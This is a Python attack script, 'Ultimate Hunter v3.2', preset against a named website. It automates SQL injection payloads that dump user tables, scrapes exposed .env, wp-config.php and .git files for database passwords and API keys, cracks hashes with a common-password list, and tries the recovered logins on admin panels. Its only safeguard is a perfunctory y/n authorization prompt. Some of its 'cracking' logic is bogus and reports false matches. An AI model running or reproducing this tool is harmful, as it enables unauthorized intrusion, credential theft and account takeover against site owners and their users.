#!/usr/bin/env python3
"""
Yamersal Ultimate Hunter v3.2
Advanced Credential Extraction & Auto Exploitation
Author: Security Researcher
Version: 3.2 - Improved Pattern Detection
"""

import requests
import json
import urllib.parse
import re
import time
import sys
import os
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor

class HashCracker:
    def __init__(self):
        self.common_passwords = [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'admin', 'welcome', 'monkey', 'password1',
            '1234567890', 'abcd1234', 'sunshine', 'princess', 'qwertyuiop',
            'letmein', '123abc', 'admin123', 'welcome123', 'password123',
            'test', 'guest', 'root', 'pass', 'pass123', 'admin@123',
            '123456a', '123', '1', 'password@123', 'yamersal', 'admin123',
            '000000', '123456789a', '123qwe', '1q2w3e4r', 'qazwsx',
            'password1', 'password12', 'password1234', 'iloveyou',
            'master', '666666', 'abc123', 'football', 'jordan',
            'harley', 'ranger', 'jennifer', 'hunter', '2000',
            'superman', 'batman', 'trustno1', 'killer', 'welcome1'
        ]

    def crack_hash(self, hash_value):
        """Crack hash using multiple methods"""
        # Skip if it's not a real hash
        if not self.is_valid_hash(hash_value):
            return None
            
        methods = [
            self.try_common_passwords,
            self.try_xor_decryption,
            self.try_hex_decoding,
            self.try_base64_decoding,
            self.try_md5_hash,
            self.try_sha1_hash
        ]
        
        for method in methods:
            result = method(hash_value)
            if result:
                return result
        
        return None

    def is_valid_hash(self, hash_value):
        """Check if this is a valid hash (not Cloudflare protection, etc.)"""
        invalid_patterns = [
            'email-protection',
            'data-cfemail', 
            'cloudflare',
            '1234',
            'welcome',
            'admin',
            'test'
        ]
        
        # If hash contains any invalid patterns, skip it
        for pattern in invalid_patterns:
            if pattern in hash_value.lower():
                return False
        
        # Valid hash should be hex string with reasonable length
        if len(hash_value) < 32 or len(hash_value) > 128:
            return False
            
        # Should be primarily hex characters
        hex_chars = sum(1 for c in hash_value if c in '0123456789abcdefABCDEF')
        if hex_chars / len(hash_value) < 0.8:  # At least 80% hex chars
            return False
            
        return True

    def try_common_passwords(self, hash_value):
        """Try common passwords"""
        for password in self.common_passwords:
            # If hash is hex encoded password
            if password.encode().hex() == hash_value.lower():
                return {'password': password, 'method': 'hex_encoding'}
            
            # Simple pattern matching
            if self.simple_pattern_match(password, hash_value):
                return {'password': password, 'method': 'pattern_match'}
        
        return None

    def try_xor_decryption(self, hex_string):
        """XOR decryption"""
        keys = [0x20, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x50, 0x55, 0xAA, 0xFF]
        
        try:
            if len(hex_string) % 2 != 0:
                hex_string = '0' + hex_string
            
            bytes_data = bytes.fromhex(hex_string)
            
            for key in keys:
                decrypted = bytes(b ^ key for b in bytes_data)
                
                try:
                    text = decrypted.decode('utf-8', errors='ignore')
                    if text.isprintable() and 3 <= len(text) <= 20 and self.looks_like_password(text):
                        return {'password': text, 'method': f'xor_{hex(key)}'}
                except:
                    continue
                    
        except:
            pass
        
        return None

    def looks_like_password(self, text):
        """Check if text looks like a real password"""
        # Skip common false positives
        false_positives = ['email-protection', 'data-cfemail', 'cloudflare', 'cdn-cgi']
        if any(fp in text.lower() for fp in false_positives):
            return False
            
        # Should contain alphanumeric characters
        if not any(c.isalnum() for c in text):
            return False
            
        return True

    def try_hex_decoding(self, hex_string):
        """Hex decoding"""
        try:
            clean_hex = ''.join(c for c in hex_string if c in '0123456789abcdefABCDEF')
            
            if len(clean_hex) % 2 != 0:
                clean_hex = clean_hex[:-1]
                
            if len(clean_hex) >= 4:
                decoded = bytes.fromhex(clean_hex)
                
                try:
                    text = decoded.decode('utf-8', errors='ignore')
                    if any(c.isalnum() for c in text) and 3 <= len(text) <= 20 and self.looks_like_password(text):
                        return {'password': text, 'method': 'hex_decoding'}
                except:
                    pass
                    
        except:
            pass
        
        return None

    def try_base64_decoding(self, data):
        """Base64 decoding"""
        try:
            padding = 4 - len(data) % 4
            if padding != 4:
                data += '=' * padding
            
            decoded = base64.b64decode(data)
            text = decoded.decode('utf-8', errors='ignore')
            
            if any(c.isalnum() for c in text) and 3 <= len(text) <= 20 and self.looks_like_password(text):
                return {'password': text, 'method': 'base64_decoding'}
                
        except:
            pass
        
        return None

    def try_md5_hash(self, hash_value):
        """MD5 hash cracking"""
        if len(hash_value) == 32:
            for password in self.common_passwords:
                md5_hash = hashlib.md5(password.encode()).hexdigest()
                if md5_hash == hash_value.lower():
                    return {'password': password, 'method': 'md5'}
        
        return None

    def try_sha1_hash(self, hash_value):
        """SHA1 hash cracking"""
        if len(hash_value) == 40:
            for password in self.common_passwords:
                sha1_hash = hashlib.sha1(password.encode()).hexdigest()
                if sha1_hash == hash_value.lower():
                    return {'password': password, 'method': 'sha1'}
        
        return None

    def simple_pattern_match(self, password, hash_value):
        """Simple pattern matching"""
        if len(hash_value) == len(password) * 2:
            return True
        
        password_parts = [password[i:i+3] for i in range(0, len(password), 3)]
        for part in password_parts:
            if part in hash_value.lower():
                return True
        
        return False

class AutoExploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def exploit_sql_injection(self, parameters):
        """Exploit SQL Injection vulnerabilities"""
        self.print_status("🎯 Exploiting SQL Injection vulnerabilities...", "CRITICAL")
        
        sql_payloads = [
            # Extract user data
            "' UNION SELECT user_login,user_pass,user_email,NULL FROM wp_users--",
            "' UNION SELECT username,password,email,NULL FROM users--",
            "' UNION SELECT user,pass,email,NULL FROM admin_users--",
            "' UNION SELECT name,password,email,NULL FROM members--",
        ]
        
        exploited_data = []
        
        for param in parameters:
            self.print_status(f"🔍 Testing parameter: {param}", "INFO")
            
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=15)
                    
                    if response.status_code == 200:
                        data = self.extract_exploited_data(response.text, test_url, payload)
                        if data:
                            exploited_data.extend(data)
                            self.print_status(f"   ✅ Successfully exploited {param}", "SUCCESS")
                            break
                            
                except Exception as e:
                    continue
        
        return exploited_data

    def extract_exploited_data(self, content, url, payload):
        """Extract exploited data from response"""
        data = []
        
        # Improved patterns to avoid false positives
        user_patterns = [
            # Look for table-like structures with usernames and hashes
            r'<td[^>]*>([a-zA-Z0-9_@\.-]{3,50})</td>[^<]*<td[^>]*>([a-fA-F0-9]{32,128})</td>',
            r'<tr[^>]*>[^<]*<td[^>]*>([a-zA-Z0-9_@\.-]{3,50})</td>[^<]*<td[^>]*>([a-fA-F0-9]{32,128})</td>',
            # Look for div structures
            r'<div[^>]*>([a-zA-Z0-9_@\.-]{3,50})</div>[^<]*<div[^>]*>([a-fA-F0-9]{32,128})</div>',
        ]
        
        for pattern in user_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) == 2:
                    username, hash_value = match
                    if self.is_valid_credential(username, hash_value):
                        data.append({
                            'type': 'credentials',
                            'username': username.strip(),
                            'hash': hash_value.strip(),
                            'source': 'sql_injection',
                            'url': url,
                            'payload': payload
                        })
        
        return data

    def is_valid_credential(self, username, hash_value):
        """Check if this looks like a real credential"""
        # Skip common false positives
        false_usernames = ['email-protection', 'data-cfemail', 'cloudflare', 'cdn-cgi']
        if any(fp in username.lower() for fp in false_usernames):
            return False
            
        # Skip common false hash patterns
        false_hashes = ['1234', 'welcome', 'admin', 'test']
        if any(fp in hash_value.lower() for fp in false_hashes):
            return False
            
        # Username should be reasonable length and format
        if len(username) < 3 or len(username) > 50:
            return False
            
        # Hash should be reasonable length
        if len(hash_value) < 32 or len(hash_value) > 128:
            return False
            
        return True

    def exploit_config_files(self):
        """Exploit exposed configuration files"""
        self.print_status("🎯 Exploiting configuration files...", "CRITICAL")
        
        config_files = [
            '/.git/config', '/.htaccess', '/.DS_Store', '/robots.txt',
            '/wp-config.php', '/config.php', '/.env', '/web.config'
        ]
        
        exploited_configs = []
        
        for config_file in config_files:
            try:
                url = f"{self.target}{config_file}"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    sensitive_data = self.extract_sensitive_data(response.text, url)
                    if sensitive_data:
                        exploited_configs.extend(sensitive_data)
                        self.print_status(f"   ✅ Exploited {config_file}", "SUCCESS")
                        
            except Exception as e:
                continue
        
        return exploited_configs

    def extract_sensitive_data(self, content, url):
        """Extract sensitive data from files"""
        sensitive_data = []
        
        patterns = {
            'database_credentials': r'(DB_|DATABASE_)[^=]*=[\'"]([^\'"]+)[\'"]',
            'api_keys': r'(API_?KEY|SECRET_?KEY)[=:\s]+[\'"]([^\'"]+)[\'"]',
            'passwords': r'(PASSWORD|PASS|PWD)[=:\s]+[\'"]([^\'"]+)[\'"]',
            'emails': r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
        }
        
        for data_type, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    data = ' '.join([m for m in match if m])
                else:
                    data = match
                
                if data and len(data) > 3:
                    sensitive_data.append({
                        'type': 'sensitive_data',
                        'data_type': data_type,
                        'data': data,
                        'source': 'config_file',
                        'url': url
                    })
        
        return sensitive_data

    def test_credentials_login(self, credentials):
        """Test credentials on admin panels"""
        self.print_status("🎯 Testing credentials on admin panels...", "CRITICAL")
        
        admin_pages = [
            '/admin', '/login', '/wp-admin', '/dashboard',
            '/administrator', '/cp', '/controlpanel', '/admin.php'
        ]
        
        successful_logins = []
        
        for page in admin_pages:
            url = f"{self.target}{page}"
            
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    
                    for cred in credentials:
                        if cred.get('password'):
                            # Attempt login
                            login_data = {
                                'username': cred['username'],
                                'password': cred['password'],
                                'email': cred['username'],
                                'user': cred['username'],
                                'pass': cred['password']
                            }
                            
                            login_response = self.session.post(url, data=login_data, timeout=10)
                            
                            if self.check_login_success(login_response):
                                successful_logins.append({
                                    'login_page': url,
                                    'username': cred['username'],
                                    'password': cred['password'],
                                    'redirect_url': login_response.url,
                                    'source': cred.get('source', 'unknown')
                                })
                                self.print_status(f"   ✅ Login successful: {cred['username']} on {page}", "CRITICAL")
                                
            except Exception as e:
                continue
        
        return successful_logins

    def check_login_success(self, response):
        """Check if login was successful"""
        success_indicators = [
            'logout', 'dashboard', 'admin', 'welcome', 'success',
            'manage', 'control', 'panel'
        ]
        
        failure_indicators = [
            'error', 'invalid', 'incorrect', 'failed', 'wrong'
        ]
        
        content_lower = response.text.lower()
        
        # If redirected to different page
        if response.url and 'login' not in response.url.lower():
            return True
        
        # Check for success indicators
        for indicator in success_indicators:
            if indicator in content_lower:
                return True
        
        return False

    def print_status(self, message, level="INFO"):
        """Print status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

class UltimateHunter:
    def __init__(self, target="https://yamersal.com"):
        self.target = self.validate_target(target)
        self.session = requests.Session()
        self.hash_cracker = HashCracker()
        self.auto_exploiter = AutoExploiter(self.target)
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def validate_target(self, target):
        """Validate and format target URL"""
        target = target.strip()
        
        if not target:
            return "https://yamersal.com"
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        target = target.rstrip('/')
        
        return target

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def test_connection(self):
        """Test if target is accessible"""
        try:
            self.print_status(f"Testing connection to: {self.target}", "INFO")
            response = self.session.get(self.target, timeout=10)
            
            if response.status_code == 200:
                self.print_status(f"✅ Target is accessible: {self.target}", "SUCCESS")
                return True
            else:
                self.print_status(f"⚠️ Target responded with status: {response.status_code}", "WARNING")
                return True
                
        except requests.exceptions.ConnectionError as e:
            self.print_status(f"❌ Connection failed: Cannot reach {self.target}", "ERROR")
            self.print_status(f"💡 Please check the URL and your internet connection", "INFO")
            return False
        except requests.exceptions.Timeout:
            self.print_status(f"❌ Connection timeout: {self.target} is not responding", "ERROR")
            return False
        except Exception as e:
            self.print_status(f"❌ Connection error: {e}", "ERROR")
            return False

    def extract_from_sql_injection(self):
        """Extract credentials from SQL Injection with hash cracking"""
        self.print_status("🔓 Extracting credentials via SQL Injection...", "CRITICAL")
        
        parameters = ['id', 'page', 'file', 'path', 'view']
        sql_payloads = [
            "' UNION SELECT user_login,user_pass,user_email FROM wp_users--",
            "' UNION SELECT username,password,email FROM users--",
            "' UNION SELECT username,password,email FROM admin_users--"
        ]
        
        all_credentials = []
        
        for param in parameters:
            self.print_status(f"🔍 Testing parameter: {param}", "INFO")
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    self.print_status(f"   Trying: {test_url[:80]}...", "INFO")
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        # Check if we got actual database results
                        if self.has_database_data(content):
                            credentials = self.extract_and_crack_credentials(content, test_url)
                            if credentials:
                                all_credentials.extend(credentials)
                                self.print_status(f"   ✅ Found {len(credentials)} real credentials in {param}", "SUCCESS")
                            else:
                                self.print_status(f"   ℹ️ Found SQL injection but no credentials in {param}", "INFO")
                                
                except Exception as e:
                    continue
        
        return all_credentials

    def has_database_data(self, content):
        """Check if content contains actual database data (not false positives)"""
        # Look for actual database indicators
        database_indicators = [
            'wp_users', 'wp_', 'user_login', 'user_pass',
            'admin@', 'root@', 'database', 'mysql'
        ]
        
        # Remove HTML tags for better analysis
        clean_content = re.sub(r'<[^>]+>', ' ', content)
        
        for indicator in database_indicators:
            if indicator in clean_content:
                return True
                
        return False

    def extract_and_crack_credentials(self, content, url):
        """Extract and crack credentials from response"""
        credentials = []
        
        # Improved patterns for real credentials
        patterns = [
            # Table structure with username and hash
            r'<td[^>]*>([a-zA-Z0-9_@\.-]{3,50})</td>[^<]*<td[^>]*>([a-fA-F0-9]{32,128})</td>',
            # Div structure  
            r'<div[^>]*>([a-zA-Z0-9_@\.-]{3,50})</div>[^<]*<div[^>]*>([a-fA-F0-9]{32,128})</div>',
            # Plain text with separators
            r'([a-zA-Z0-9_@\.-]{3,50})\s*[\|\-:]\s*([a-fA-F0-9]{32,128})',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for username, hash_value in matches:
                if self.is_valid_credential(username, hash_value):
                    # Crack the hash
                    crack_result = self.hash_cracker.crack_hash(hash_value)
                    
                    credential = {
                        'username': username.strip(),
                        'hash': hash_value.strip(),
                        'url': url,
                        'cracked': False
                    }
                    
                    if crack_result:
                        credential['password'] = crack_result['password']
                        credential['crack_method'] = crack_result['method']
                        credential['cracked'] = True
                        self.print_status(f"      🔓 Cracked: {username} -> {crack_result['password']}", "CRITICAL")
                    else:
                        self.print_status(f"      🔑 Found but not cracked: {username}", "INFO")
                    
                    credentials.append(credential)
        
        return credentials

    def is_valid_credential(self, username, hash_value):
        """Validate if this is a real credential"""
        # Skip Cloudflare and common false positives
        false_patterns = [
            'email-protection', 'data-cfemail', 'cloudflare', 'cdn-cgi',
            '1234', 'welcome', 'admin', 'test', 'guest'
        ]
        
        for pattern in false_patterns:
            if pattern in username.lower() or pattern in hash_value.lower():
                return False
        
        # Basic validation
        if len(username) < 3 or len(username) > 50:
            return False
            
        if len(hash_value) < 32 or len(hash_value) > 128:
            return False
            
        # Hash should be primarily hex characters
        hex_chars = sum(1 for c in hash_value if c in '0123456789abcdefABCDEF')
        if hex_chars / len(hash_value) < 0.8:
            return False
            
        return True

    def run_complete_exploitation(self):
        """Run complete exploitation process"""
        self.print_status("🚀 Starting complete exploitation...", "CRITICAL")
        self.print_status(f"🎯 Target: {self.target}", "INFO")
        
        if not self.test_connection():
            self.print_status("❌ Cannot continue without connection to target", "ERROR")
            return
        
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("🎯 ULTIMATE EXPLOITATION STARTED", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        all_results = {}
        
        # 1. Extract and crack SQL Injection credentials
        sql_credentials = self.extract_from_sql_injection()
        all_results['sql_credentials'] = sql_credentials
        
        # 2. Intensive SQL exploitation
        exploited_sql = self.auto_exploiter.exploit_sql_injection(['id', 'file', 'path', 'view'])
        all_results['exploited_sql'] = exploited_sql
        
        # 3. Configuration files exploitation
        exploited_configs = self.auto_exploiter.exploit_config_files()
        all_results['exploited_configs'] = exploited_configs
        
        # 4. Collect cracked credentials
        cracked_credentials = [cred for cred in sql_credentials if cred.get('cracked', False)]
        
        # 5. Test login with cracked credentials
        successful_logins = []
        if cracked_credentials:
            successful_logins = self.auto_exploiter.test_credentials_login(cracked_credentials)
        all_results['successful_logins'] = successful_logins
        
        # 6. Display final results
        self.display_final_results(all_results)
        
        return all_results

    def display_final_results(self, results):
        """Display final exploitation results"""
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("📊 FINAL EXPLOITATION RESULTS", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        sql_creds = results.get('sql_credentials', [])
        exploited_sql = results.get('exploited_sql', [])
        exploited_configs = results.get('exploited_configs', [])
        successful_logins = results.get('successful_logins', [])
        
        # Statistics
        total_credentials = len(sql_creds)
        cracked_credentials = len([c for c in sql_creds if c.get('cracked', False)])
        total_exploited = len(exploited_sql) + len(exploited_configs)
        
        self.print_status(f"\n📈 EXPLOITATION STATISTICS:", "INFO")
        self.print_status(f"   🔓 Real credentials found: {total_credentials}", "INFO")
        self.print_status(f"   🔑 Passwords cracked: {cracked_credentials}", "CRITICAL")
        self.print_status(f"   🎯 Data exploited: {total_exploited}", "SUCCESS")
        self.print_status(f"   🔐 Successful logins: {len(successful_logins)}", "SUCCESS")
        
        # Display cracked credentials
        if cracked_credentials > 0:
            self.print_status(f"\n🎯 CRACKED CREDENTIALS:", "CRITICAL")
            for cred in sql_creds:
                if cred.get('cracked', False):
                    self.print_status(f"   👤 {cred['username']} : 🗝️ {cred['password']}", "SUCCESS")
                    self.print_status(f"   🛠️  Method: {cred['crack_method']}", "INFO")
        
        # Display successful logins
        if successful_logins:
            self.print_status(f"\n🔐 SUCCESSFUL LOGINS:", "CRITICAL")
            for login in successful_logins:
                self.print_status(f"   🌐 Page: {login['login_page']}", "SUCCESS")
                self.print_status(f"   👤 Username: {login['username']}", "INFO")
                self.print_status(f"   🗝️  Password: {login['password']}", "CRITICAL")
                self.print_status(f"   🔗 Redirected to: {login['redirect_url']}", "INFO")
        
        # If no real results
        if total_credentials == 0:
            self.print_status(f"\n❌ No real credentials found", "WARNING")
            self.print_status(f"💡 The site might be protected or using different database structure", "INFO")
            self.print_status(f"💡 Try manual testing with these URLs:", "INFO")
            self.print_status(f"   {self.target}?id=' UNION SELECT user_login,user_pass,user_email FROM wp_users--", "INFO")
            self.print_status(f"   {self.target}?file=' UNION SELECT username,password,email FROM users--", "INFO")
        
        # Save report
        self.generate_complete_report(results)

    def generate_complete_report(self, results):
        """Generate complete exploitation report"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"exploitation_report_{timestamp}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("ULTIMATE EXPLOITATION REPORT\n")
                f.write("=" * 50 + "\n\n")
                
                f.write(f"Target: {self.target}\n")
                f.write(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                # Cracked credentials
                sql_creds = results.get('sql_credentials', [])
                cracked_creds = [c for c in sql_creds if c.get('cracked', False)]
                
                if cracked_creds:
                    f.write("CRACKED CREDENTIALS:\n")
                    f.write("-" * 40 + "\n")
                    for cred in cracked_creds:
                        f.write(f"Username: {cred['username']}\n")
                        f.write(f"Password: {cred['password']}\n")
                        f.write(f"Method: {cred['crack_method']}\n")
                        f.write(f"Source: {cred['url']}\n")
                        f.write("-" * 40 + "\n")
                
                # Successful logins
                successful_logins = results.get('successful_logins', [])
                if successful_logins:
                    f.write("\nSUCCESSFUL LOGINS:\n")
                    f.write("-" * 40 + "\n")
                    for login in successful_logins:
                        f.write(f"Page: {login['login_page']}\n")
                        f.write(f"Username: {login['username']}\n")
                        f.write(f"Password: {login['password']}\n")
                        f.write(f"Redirect: {login['redirect_url']}\n")
                        f.write("-" * 40 + "\n")
                
                f.write(f"\nSUMMARY:\n")
                f.write(f"Credentials found: {len(sql_creds)}\n")
                f.write(f"Passwords cracked: {len(cracked_creds)}\n")
                f.write(f"Successful logins: {len(successful_logins)}\n")
            
            self.print_status(f"\n💾 Report saved: {filename}", "SUCCESS")
            
        except Exception as e:
            self.print_status(f"❌ Save error: {e}", "ERROR")

def main():
    """Main function"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                         ULTIMATE HUNTER v3.2                                ║
║          Advanced Exploitation & Hash Cracking (False Positive Fix)         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    # Get target URL
    target = input("Enter target URL (default: https://yamersal.com): ").strip()
    
    print(f"\n⚠️  LEGAL DISCLAIMER: This tool is for authorized penetration testing only!")
    print(f"⚠️  Unauthorized use may be illegal in your jurisdiction!")
    print(f"⚠️  Use only on systems you own or have explicit permission to test!\n")
    
    confirm = input("Do you have authorization to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled. Exiting...")
        sys.exit(0)
    
    try:
        hunter = UltimateHunter(target)
        hunter.run_complete_exploitation()
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user. Exiting...")
    except Exception as e:
        print(f"\nScan failed with error: {e}")

if __name__ == "__main__":
    main()